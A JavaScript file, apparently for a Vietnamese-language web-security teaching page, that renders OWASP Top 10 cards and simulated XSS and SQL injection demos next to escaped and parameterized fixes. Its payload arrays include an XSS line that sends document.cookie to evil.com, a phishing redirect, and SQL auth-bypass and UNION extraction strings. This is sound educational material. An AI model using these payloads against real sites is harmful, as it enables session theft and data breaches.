// ── Navigation ──
function show(id) {
  document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
  document.querySelectorAll('.nav-item').forEach(b => b.classList.remove('active'));
  document.getElementById('sec-' + id).classList.add('active');
  const ids = ['owasp', 'xss', 'sqli', 'csrf', 'csp', 'headers'];
  const idx = ids.indexOf(id);
  if (idx !== -1) document.querySelectorAll('.nav-item')[idx].classList.add('active');
}

// ── OWASP Top 10 data ──
const owaspData = [
  { n: 'A01', name: 'Broken Access Control',       risk: 94, sev: 'CRITICAL', desc: 'User truy cập resource ngoài quyền. Ví dụ: đổi user_id trên URL để xem profile người khác, escalate privilege.' },
  { n: 'A02', name: 'Cryptographic Failures',       risk: 79, sev: 'HIGH',     desc: 'Dữ liệu nhạy cảm không được mã hóa: lưu password dạng MD5/plain text, truyền data qua HTTP không mã hóa.' },
  { n: 'A03', name: 'Injection (XSS, SQLi)',         risk: 94, sev: 'CRITICAL', desc: 'SQL, XSS, LDAP, OS command injection. User input được interpret như lệnh thay vì data.' },
  { n: 'A04', name: 'Insecure Design',               risk: 40, sev: 'HIGH',     desc: 'Thiếu threat modeling, không có security design pattern từ đầu dự án. Không thể fix bằng code đơn thuần.' },
  { n: 'A05', name: 'Security Misconfiguration',     risk: 90, sev: 'HIGH',     desc: 'Default credentials, verbose error messages, open cloud storage, unnecessary features enabled, missing hardening.' },
  { n: 'A06', name: 'Vulnerable Components',         risk: 75, sev: 'HIGH',     desc: 'Dùng thư viện, framework lỗi thời có CVE đã biết. Ví dụ: log4j, OpenSSL cũ. Dùng npm audit, Snyk để scan.' },
  { n: 'A07', name: 'Auth & Session Failures',       risk: 85, sev: 'CRITICAL', desc: 'Weak password policy, không brute-force protection, session token không expire, session fixation.' },
  { n: 'A08', name: 'Data Integrity Failures',       risk: 60, sev: 'HIGH',     desc: 'Deserialization không an toàn, unsigned auto-update, CI/CD pipeline không có integrity verification.' },
  { n: 'A09', name: 'Logging & Monitoring Failures', risk: 65, sev: 'MEDIUM',   desc: 'Không log sự kiện bảo mật quan trọng, không có alerting, log lưu local không được bảo vệ.' },
  { n: 'A10', name: 'Server-Side Request Forgery',   risk: 70, sev: 'HIGH',     desc: 'Server bị lừa fetch URL do attacker kiểm soát — scan nội bộ, đọc cloud metadata, SSRF → RCE.' },
];

// Build OWASP grid
const grid = document.getElementById('owaspGrid');
let selectedIdx = -1;

owaspData.forEach((o, i) => {
  const card = document.createElement('div');
  card.className = 'owasp-card';

  const riskColor = o.sev === 'CRITICAL' ? '#f85149' : o.sev === 'HIGH' ? '#d29922' : '#58a6ff';
  const badgeClass = o.sev === 'CRITICAL' ? 'badge-red' : 'badge-yellow';

  card.innerHTML = `
    <div class="owasp-num">${o.n} · 2021</div>
    <div class="owasp-name">${o.name}</div>
    <span class="badge ${badgeClass}">${o.sev}</span>
    <div class="risk-bar">
      <div class="risk-fill" style="width:${o.risk}%; background:${riskColor}"></div>
    </div>`;

  card.addEventListener('click', () => {
    const detail = document.getElementById('owaspDetail');
    if (selectedIdx === i) {
      detail.innerHTML = '';
      card.classList.remove('selected');
      selectedIdx = -1;
      return;
    }
    document.querySelectorAll('.owasp-card').forEach(c => c.classList.remove('selected'));
    card.classList.add('selected');
    selectedIdx = i;
    detail.innerHTML = `
      <div class="info-box blue" style="margin-top:1rem;">
        <div class="info-title">${o.n} — ${o.name}</div>
        ${o.desc}<br><br>
        <strong>Prevalence: ${o.risk}%</strong> của các ứng dụng được kiểm tra có lỗ hổng này.
      </div>`;
  });

  grid.appendChild(card);
});

// ── Utility: escape HTML ──
function esc(s) {
  return s
    .replace(/&/g,  '&amp;')
    .replace(/</g,  '&lt;')
    .replace(/>/g,  '&gt;')
    .replace(/"/g,  '&quot;')
    .replace(/'/g,  '&#x27;');
}

// ── XSS Demo ──
// FIX: tách '</scr' + 'ipt>' để tránh browser đóng nhầm thẻ script
const xssPayloads = [
  '<img src=x onerror="alert(document.cookie)">',
  '<svg onload="fetch(\'https://evil.com/steal?c=\'+document.cookie)">',
  '"><scr' + 'ipt>document.location=\'https://evil.com/phish\'</scr' + 'ipt>',
];

function loadXSSPayload(i) {
  document.getElementById('xssInput').value     = xssPayloads[i];
  document.getElementById('xssInputSafe').value = xssPayloads[i];
}

function demoXSSVuln() {
  const val = document.getElementById('xssInput').value;
  const out = document.getElementById('xssVulnOut');
  out.className = 'output danger';
  out.innerHTML = `
    <strong>⚡ ATTACK EXECUTED</strong> — Script injected into DOM!<br><br>
    Raw output server trả về:<br>
    <code>${esc(val)}</code><br><br>
    <span style="opacity:.8">
      → Browser parse tag &amp; chạy JS ngay lập tức<br>
      → Attacker có thể đọc: document.cookie = "session=abc123xyz"
    </span>`;
}

function demoXSSSafe() {
  const val = document.getElementById('xssInputSafe').value;
  const out = document.getElementById('xssSafeOut');
  out.className = 'output success';
  const escaped = esc(val);
  out.innerHTML = `
    <strong>✅ ATTACK BLOCKED</strong> — Input safely escaped<br><br>
    Escaped output (literal text):<br>
    <code>${esc(escaped)}</code><br><br>
    → Browser hiển thị như text, không parse HTML<br>
    → Không có script nào được chạy`;
}

// ── SQL Injection Demo ──
const sqlPayloads = [
  "' OR '1'='1' --",
  "' UNION SELECT username,password,3 FROM users --",
];

function loadSQLPayload(i) {
  document.getElementById('sqliUser').value = sqlPayloads[i];
}

function demoSQLI() {
  const u = document.getElementById('sqliUser').value;
  const p = document.getElementById('sqliPass').value;
  const out = document.getElementById('sqliOut');
  const query = `SELECT * FROM users WHERE username = '${u}' AND password = '${p}'`;
  const injected = u.includes("'") || u.includes(';') || u.includes('--');

  if (injected) {
    let explain = '';
    if (u.includes('--')) {
      explain = '→ Dấu -- comment out toàn bộ phần AND password<br>→ Login thành công dù password sai!';
    } else if (u.toLowerCase().includes('union')) {
      explain = '→ UNION SELECT lấy data từ bảng khác<br>→ Kết quả chứa toàn bộ username/password trong DB!';
    } else if (u.includes("'1'='1")) {
      explain = "→ OR '1'='1' luôn true → WHERE = true cho MỌI ROW<br>→ Trả về toàn bộ users trong DB";
    } else {
      explain = "→ Ký tự ' phá vỡ cấu trúc query gốc";
    }
    out.className = 'output danger';
    out.innerHTML = `
      <strong>⚡ SQL INJECTION DETECTED</strong><br><br>
      Query gửi đến DB:<br>
      <code>${esc(query)}</code><br><br>
      ${explain}`;
  } else {
    out.className = 'output';
    out.innerHTML = `Query (không có injection):<br><code>${esc(query)}</code>`;
  }
}

function demoSQLISafe() {
  const u = document.getElementById('sqliUserSafe').value;
  const out = document.getElementById('sqliSafeOut');
  out.className = 'output success';
  out.innerHTML = `
    <strong>✅ INJECTION BLOCKED</strong> — Parameterized query<br><br>
    Template: <code>SELECT * FROM users WHERE username = ? AND password = ?</code><br><br>
    Params truyền riêng: <code>["${esc(u)}", "***"]</code><br><br>
    → DB driver escape toàn bộ special chars<br>
    → Input được treat như literal string, không bao giờ là SQL code<br>
    → <strong>Không thể inject dù nhập bất cứ gì</strong>`;
}